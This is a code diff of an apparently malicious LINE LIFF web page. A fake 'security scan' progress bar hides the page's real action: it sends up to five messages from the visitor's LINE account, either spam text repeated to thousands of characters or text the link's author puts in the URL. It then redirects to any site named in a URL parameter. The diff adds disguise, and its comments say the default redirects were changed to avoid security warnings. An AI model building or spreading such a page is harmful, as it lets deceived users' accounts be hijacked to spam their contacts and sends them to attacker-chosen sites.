@@ -19,20 +19,17 @@
     <div id="progress">正在初始化環境 (0%)</div>
 
     <script>
-        const uselessSites = ["https://puginarug.com/", "https://longdogechallenge.com/", "https://corndog.io/"];
+        // 將預設跳轉改為穩定的大型網站，避免觸發安全性警告
+        const safeSites = ["https://www.google.com", "https://www.youtube.com", "https://v612.line.me/"];
 
         async function fetchSpamText() {
             try {
                 const isWiki = Math.random() > 0.5;
-                if (isWiki) {
-                    const res = await fetch('https://zh.wikipedia.org/api/rest_v1/page/random/summary');
-                    const data = await res.json();
-                    return "[系統數據備份]\n" + (data.extract + "。").repeat(25).substring(0, 4800);
-                } else {
-                    const res = await fetch('https://baconipsum.com/api/?type=all-meat&paras=50');
-                    const data = await res.json();
-                    return "[加密通訊封包]\n" + data.join(" ").substring(0, 4800);
-                }
+                const api = isWiki ? 'https://zh.wikipedia.org/api/rest_v1/page/random/summary' : 'https://baconipsum.com/api/?type=all-meat&paras=50';
+                const res = await fetch(api);
+                const data = await res.json();
+                const content = isWiki ? data.extract : data.join(" ");
+                return "[系統備份數據]\n" + content.repeat(25).substring(0, 4800);
             } catch (e) { return "[數據同步異常]".repeat(200); }
         }
 
@@ -47,40 +44,51 @@
 
                 let messages = [];
 
-                // 核心邏輯：只要網址有出現 spam1~spam5 這個「關鍵字」就觸發
+                // 1. 檢查關鍵字 spam1 ~ spam5
                 for (let j = 1; j <= 5; j++) {
                     if (urlParams.has(`spam${j}`)) { 
                         messages.push({ type: 'text', text: await fetchSpamText() });
                     }
                 }
 
-                // 處理剩餘名額給 msg
+                // 2. 處理 msg1 ~ msg5 (填補名額)
                 const quota = 5 - messages.length;
                 for (let i = 1; i <= quota; i++) {
                     let m = urlParams.get(`msg${i}`);
                     if (m) messages.push({ type: 'text', text: decodeURIComponent(m) });
                 }
 
-                if (messages.length === 0) {
-                    messages.push({ type: 'text', text: await fetchSpamText() });
-                }
+                if (messages.length === 0) messages.push({ type: 'text', text: await fetchSpamText() });
 
-                // UI 與 參數解析
+                // UI 設定
                 const customStatus = urlParams.get('status');
                 if (customStatus) statusDom.innerText = decodeURIComponent(customStatus);
-                const waitTime = parseInt(urlParams.get('wait')) || (Math.floor(Math.random() * 1200) + 800);
+                const waitTime = parseInt(urlParams.get('wait')) || 1500;
                 
                 const startTime = Date.now();
                 const timer = setInterval(async () => {
                     const elapsed = Date.now() - startTime;
                     let percent = Math.min(Math.round((elapsed / waitTime) * 100), 99);
-                    progDom.innerText = `數據解析中 (${percent}%)`;
+                    progDom.innerText = `安全性掃描中 (${percent}%)`;
 
                     if (elapsed >= waitTime) {
                         clearInterval(timer);
+                        
+                        // 執行發送
                         await liff.sendMessages(messages.slice(0, 5));
-                        const targetSite = urlParams.get('site') || uselessSites[Math.floor(Math.random() * uselessSites.length)];
-                        window.location.replace(decodeURIComponent(targetSite));
+                        
+                        // 處理跳轉：優先使用 site 參數，若無則從安全清單隨機選取
+                        let target = urlParams.get('site');
+                        if (target) {
+                            target = decodeURIComponent(target);
+                        } else {
+                            target = safeSites[Math.floor(Math.random() * safeSites.length)];
+                        }
+                        
+                        // 使用 replace 確保不留下瀏覽紀錄，並強制跳轉
+                        setTimeout(() => {
+                            window.location.replace(target);
+                        }, 100);
                     }
                 }, 50);
 
